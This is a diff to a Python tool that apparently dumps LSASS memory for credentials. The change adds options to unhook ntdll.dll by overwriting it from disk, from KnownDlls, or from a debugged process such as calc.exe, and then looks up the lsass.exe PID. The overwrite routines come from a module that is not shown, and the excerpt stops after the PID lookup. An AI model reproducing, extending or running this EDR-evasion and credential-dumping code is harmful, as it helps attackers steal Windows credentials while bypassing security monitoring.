@@ -5,7 +5,9 @@ import psutil
 import ctypes
 from ctypes import wintypes
 import warnings
-warnings.filterwarnings("ignore", category=DeprecationWarning) 
+warnings.filterwarnings("ignore", category=DeprecationWarning)
+import argparse
+from overwrite import overwrite_disk, overwrite_knowndlls, overwrite_debugproc
 
 # Constants
 PROCESS_ALL_ACCESS = 0x1F0FFF
@@ -234,7 +236,33 @@ def update_json_array(data, name_to_update, field_to_update, new_value):
     return data
 
 
+def get_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-o', '--option', required=False, default="", action='store', help='Option for library overwrite')
+    parser.add_argument('-p', '--path', required=False, default="", action='store', help='Path (file in disk or program to open in debug mode)')
+    my_args = parser.parse_args()
+    return my_args
+
+
 def main():
+    # Ntdll overwrite
+    args = get_args()
+    option = args.option
+    if option == "disk":
+        path = "C:\\Windows\\System32\\ntdll.dll"
+        if args.path != "":
+            path = args.path
+        overwrite_disk(path)
+    elif option == "knowndlls":
+        overwrite_knowndlls()
+    elif option == "debugproc":
+        path = "c:\\windows\\system32\\calc.exe"
+        if args.path != "":
+            path = args.path
+        overwrite_debugproc(path)
+    else:
+        pass
+
     pid_ = get_pid("lsass.exe")
     if pid_:
         print("[+] PID: \t\t" + str(pid_))
